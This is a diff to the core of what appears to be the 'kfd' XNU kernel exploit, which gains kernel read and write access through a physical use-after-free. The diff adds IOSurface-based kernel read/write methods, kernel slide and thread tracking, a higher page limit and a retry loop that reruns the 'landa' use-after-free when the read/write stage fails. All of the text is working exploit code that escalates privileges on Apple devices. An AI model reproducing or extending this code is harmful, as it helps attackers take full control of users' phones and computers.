@@ -27,11 +27,13 @@ enum puaf_method {
 enum kread_method {
     kread_kqueue_workloop_ctl,
     kread_sem_open,
+    kread_IOSurface,
 };
 
 enum kwrite_method {
     kwrite_dup,
     kwrite_sem_open,
+    kwrite_IOSurface,
 };
 
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
@@ -56,12 +58,16 @@ struct info {
         u64 tid;
         u64 vid;
         u64 maxfilesperproc;
+        char kern_version[512];
     } env;
     struct {
+        u64 kernel_slide;
         u64 current_map;
         u64 current_pmap;
         u64 current_proc;
         u64 current_task;
+        u64 current_thread;
+        u64 current_uthread;
         u64 kernel_map;
         u64 kernel_pmap;
         u64 kernel_proc;
@@ -70,7 +76,6 @@ struct info {
 };
 
 struct perf {
-    u64 kernel_slide;
     u64 gVirtBase;
     u64 gPhysBase;
     u64 gPhysSize;
@@ -108,6 +113,7 @@ struct puaf {
         void (*run)(struct kfd*);
         void (*cleanup)(struct kfd*);
         void (*free)(struct kfd*);
+        void (*deallocate)(struct kfd*);
     } puaf_method_ops;
 };
 
@@ -166,24 +172,34 @@ void kfd_free(struct kfd* kfd)
 
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
-    timer_start();
+    //timer_start();
 
     const u64 puaf_pages_min = 16;
-    const u64 puaf_pages_max = 2048;
+    const u64 puaf_pages_max = 3072;
     assert(puaf_pages >= puaf_pages_min);
     assert(puaf_pages <= puaf_pages_max);
     assert(puaf_method <= puaf_landa);
-    assert(kread_method <= kread_sem_open);
-    assert(kwrite_method <= kwrite_sem_open);
+    assert(kread_method <= kread_IOSurface);
+    assert(kwrite_method <= kwrite_IOSurface);
 
-    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
+    struct kfd* kfd = NULL;
+    
+retry:
+    kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
     puaf_run(kfd);
-    krkw_run(kfd);
+    if(krkw_run(kfd) == false) {
+        if(puaf_method == puaf_landa) {
+            kfd->puaf.puaf_method_ops.deallocate(kfd);
+            puaf_free(kfd);
+            kfd = NULL;
+            goto retry;
+        }
+    }
     info_run(kfd);
     perf_run(kfd);
     puaf_cleanup(kfd);
 
-    timer_end();
+    //timer_end();
     return (u64)(kfd);
 }
 
